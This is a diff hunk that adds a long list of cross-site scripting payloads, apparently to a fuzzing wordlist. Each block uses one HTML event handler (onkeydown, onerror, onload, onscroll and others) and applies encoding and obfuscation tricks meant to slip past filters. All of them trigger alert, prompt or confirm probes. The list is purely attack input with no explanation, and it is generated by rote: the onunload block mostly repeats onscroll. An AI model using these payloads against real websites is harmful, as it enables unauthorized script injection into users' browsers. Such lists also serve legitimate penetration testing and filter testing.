@@ -298,5 +298,224 @@
 &#34;&#62;<h1/onmousemove='\u0061lert(1)'>
 <a&#32;href&#61;&#91;&#00;&#93;"&#00; onmousemove=prompt&#40;1&#41;&#47;&#47;">XYZ</a
 <a href="javascript:void(0)" onmousemove=&NewLine;javascript:alert(1)&NewLine;>X</a>
-
-
+<h1 onabort=alert(document.domain)>
+&#34;&#62;<h1/onabort='\u0061lert(1)'>%00
+<input/onabort="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onabort=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onabort=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<img/src='http://i.imgur.com/P8mL8.jpg' onabort=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onabort=confirm(1)>'
+&#13;<blink/&#13; onabort=pr&#x6F;mp&#116;(1)>onabort
+<var onabort="prompt(1)">On Mouse Over</var>
+<var onabort="prompt(1)">On Mouse Over</var>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onabort="prompt(1)" onabort="alert(1)">x</button>
+<div/onabort='alert(1)'> style="x:">
+[color=red' onabort="alert('xss')"]mouse over[/color] 
+<input/onabort="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onabort='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onabort=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onabort=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<h1 onbeforeunload=alert(document.domain)>
+&#34;&#62;<h1/onbeforeunload='\u0061lert(1)'>%00
+<input/onbeforeunload="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onbeforeunload=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onbeforeunload=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<img/src='http://i.imgur.com/P8mL8.jpg' onbeforeunload=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onbeforeunload=confirm(1)>'
+&#13;<blink/&#13; onbeforeunload=pr&#x6F;mp&#116;(1)>onbeforeunload
+<var onbeforeunload="prompt(1)">On Mouse Over</var>
+<var onbeforeunload="prompt(1)">On Mouse Over</var>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onbeforeunload="prompt(1)" onbeforeunload="alert(1)">x</button>
+<div/onbeforeunload='alert(1)'> style="x:">
+[color=red' onbeforeunload="alert('xss')"]mouse over[/color] 
+<input/onbeforeunload="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onbeforeunload='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onbeforeunload=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onbeforeunload=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<h1 onkeydown=alert(document.domain)>
+&#34;&#62;<h1/onkeydown='\u0061lert(1)'>%00
+<input/onkeydown="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onkeydown=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onkeydown=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<img/src='http://i.imgur.com/P8mL8.jpg' onkeydown=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onkeydown=confirm(1)>'
+&#13;<blink/&#13; onkeydown=pr&#x6F;mp&#116;(1)>onkeydown
+<var onkeydown="prompt(1)">On Mouse Over</var>
+<var onkeydown="prompt(1)">On Mouse Over</var>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onkeydown="prompt(1)" onkeydown="alert(1)">x</button>
+<div/onkeydown='alert(1)'> style="x:">
+[color=red' onkeydown="alert('xss')"]mouse over[/color] 
+<input/onkeydown="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onkeydown='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onkeydown=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onkeydown=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<h1 onkeypress=alert(document.domain)>
+&#34;&#62;<h1/onkeypress='\u0061lert(1)'>%00
+<input/onkeypress="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onkeypress=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onkeypress=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<img/src='http://i.imgur.com/P8mL8.jpg' onkeypress=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onkeypress=confirm(1)>'
+&#13;<blink/&#13; onkeypress=pr&#x6F;mp&#116;(1)>onkeypress
+<var onkeypress="prompt(1)">On Mouse Over</var>
+<var onkeypress="prompt(1)">On Mouse Over</var>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onkeypress="prompt(1)" onkeypress="alert(1)">x</button>
+<div/onkeypress='alert(1)'> style="x:">
+[color=red' onkeypress="alert('xss')"]mouse over[/color] 
+<input/onkeypress="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onkeypress='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onkeypress=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onkeypress=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<h1 onkeyup=alert(document.domain)>
+&#34;&#62;<h1/onkeyup='\u0061lert(1)'>%00
+<input/onkeyup="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onkeyup=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onkeyup=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<img/src='http://i.imgur.com/P8mL8.jpg' onkeyup=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onkeyup=confirm(1)>'
+&#13;<blink/&#13; onkeyup=pr&#x6F;mp&#116;(1)>onkeyup
+<var onkeyup="prompt(1)">On Mouse Over</var>
+<var onkeyup="prompt(1)">On Mouse Over</var>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onkeyup="prompt(1)" onkeyup="alert(1)">x</button>
+<div/onkeyup='alert(1)'> style="x:">
+[color=red' onkeyup="alert('xss')"]mouse over[/color] 
+<input/onkeyup="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onkeyup='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onkeyup=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onkeyup=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<h1 onerror=alert(document.domain)>
+&#34;&#62;<h1/onerror='\u0061lert(1)'>%00
+<input/onerror="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onerror=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onerror=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<img/src='http://i.imgur.com/P8mL8.jpg' onerror=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onerror=confirm(1)>'
+&#13;<blink/&#13; onerror=pr&#x6F;mp&#116;(1)>onerror
+<var onerror="prompt(1)">On Mouse Over</var>
+<var onerror="prompt(1)">On Mouse Over</var>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onerror="prompt(1)" onerror="alert(1)">x</button>
+<div/onerror='alert(1)'> style="x:">
+[color=red' onerror="alert('xss')"]mouse over[/color] 
+<input/onerror="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onerror='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onerror=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onerror=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<h1 onhashchange=alert(document.domain)>
+&#34;&#62;<h1/onhashchange='\u0061lert(1)'>%00
+<input/onhashchange="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onhashchange=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onhashchange=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<img/src='http://i.imgur.com/P8mL8.jpg' onhashchange=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onhashchange=confirm(1)>'
+&#13;<blink/&#13; onhashchange=pr&#x6F;mp&#116;(1)>onhashchange
+<var onhashchange="prompt(1)">On Mouse Over</var>
+<var onhashchange="prompt(1)">On Mouse Over</var>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onhashchange="prompt(1)" onhashchange="alert(1)">x</button>
+<div/onhashchange='alert(1)'> style="x:">
+[color=red' onhashchange="alert('xss')"]mouse over[/color] 
+<input/onhashchange="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onhashchange='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onhashchange=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onhashchange=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<h1 onload=alert(document.domain)>
+&#34;&#62;<h1/onload='\u0061lert(1)'>%00
+<input/onload="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onload=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onload=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<img/src='http://i.imgur.com/P8mL8.jpg' onload=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+&#13;<blink/&#13; onload=pr&#x6F;mp&#116;(1)>onload
+<var onload="prompt(1)">On Mouse Over</var>
+<var onload="prompt(1)">On Mouse Over</var>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onload="prompt(1)" onload="alert(1)">x</button>
+<div/onload='alert(1)'> style="x:">
+[color=red' onload="alert('xss')"]mouse over[/color] 
+<input/onload="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onload='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onload=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onload=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<h1 onpageshow=alert(document.domain)>
+&#34;&#62;<h1/onpageshow='\u0061lert(1)'>%00
+<input/onpageshow="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onpageshow=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onpageshow=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<img/src='http://i.imgur.com/P8mL8.jpg' onpageshow=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onpageshow=confirm(1)>'
+&#13;<blink/&#13; onpageshow=pr&#x6F;mp&#116;(1)>onpageshow
+<var onpageshow="prompt(1)">On Mouse Over</var>
+<var onpageshow="prompt(1)">On Mouse Over</var>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onpageshow="prompt(1)" onpageshow="alert(1)">x</button>
+<div/onpageshow='alert(1)'> style="x:">
+[color=red' onpageshow="alert('xss')"]mouse over[/color] 
+<input/onpageshow="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onpageshow='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onpageshow=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onpageshow=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<h1 onpagehide=alert(document.domain)>
+&#34;&#62;<h1/onpagehide='\u0061lert(1)'>%00
+<input/onpagehide="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onpagehide=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onpagehide=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<img/src='http://i.imgur.com/P8mL8.jpg' onpagehide=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onpagehide=confirm(1)>'
+&#13;<blink/&#13; onpagehide=pr&#x6F;mp&#116;(1)>onpagehide
+<var onpagehide="prompt(1)">On Mouse Over</var>
+<var onpagehide="prompt(1)">On Mouse Over</var>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onpagehide="prompt(1)" onpagehide="alert(1)">x</button>
+<div/onpagehide='alert(1)'> style="x:">
+[color=red' onpagehide="alert('xss')"]mouse over[/color] 
+<input/onpagehide="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onpagehide='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onpagehide=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onpagehide=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<h1 onresize=alert(document.domain)>
+&#34;&#62;<h1/onresize='\u0061lert(1)'>%00
+<input/onresize="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onresize=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onresize=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<img/src='http://i.imgur.com/P8mL8.jpg' onresize=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onresize=confirm(1)>'
+&#13;<blink/&#13; onresize=pr&#x6F;mp&#116;(1)>onresize
+<var onresize="prompt(1)">On Mouse Over</var>
+<var onresize="prompt(1)">On Mouse Over</var>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onresize="prompt(1)" onresize="alert(1)">x</button>
+<div/onresize='alert(1)'> style="x:">
+[color=red' onresize="alert('xss')"]mouse over[/color] 
+<input/onresize="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onresize='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onresize=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onresize=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<h1 onscroll=alert(document.domain)>
+&#34;&#62;<h1/onscroll='\u0061lert(1)'>%00
+<input/onscroll="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onscroll=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onscroll=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<img/src='http://i.imgur.com/P8mL8.jpg' onscroll=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onscroll=confirm(1)>'
+&#13;<blink/&#13; onscroll=pr&#x6F;mp&#116;(1)>onscroll
+<var onscroll="prompt(1)">On Mouse Over</var>
+<var onscroll="prompt(1)">On Mouse Over</var>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onscroll="prompt(1)" onscroll="alert(1)">x</button>
+<div/onscroll='alert(1)'> style="x:">
+[color=red' onscroll="alert('xss')"]mouse over[/color] 
+<input/onscroll="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onscroll='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onscroll=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onscroll=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<h1 onunload=alert(document.domain)>
+&#34;&#62;<h1/onscroll='\u0061lert(1)'>%00
+<input/onscroll="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onscroll=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onscroll=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<img/src='http://i.imgur.com/P8mL8.jpg' onscroll=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onscroll=confirm(1)>'
+&#13;<blink/&#13; onscroll=pr&#x6F;mp&#116;(1)>onscroll
+<var onscroll="prompt(1)">On Mouse Over</var>
+<var onscroll="prompt(1)">On Mouse Over</var>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onscroll="prompt(1)" onscroll="alert(1)">x</button>
+<div/onscroll='alert(1)'> style="x:">
+[color=red' onscroll="alert('xss')"]mouse over[/color] 
+<input/onscroll="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#34;&#62;<h1/onscroll='\u0061lert(1)'>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onscroll=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onscroll=&NewLine;javascript:alert(1)&NewLine;>X</a>
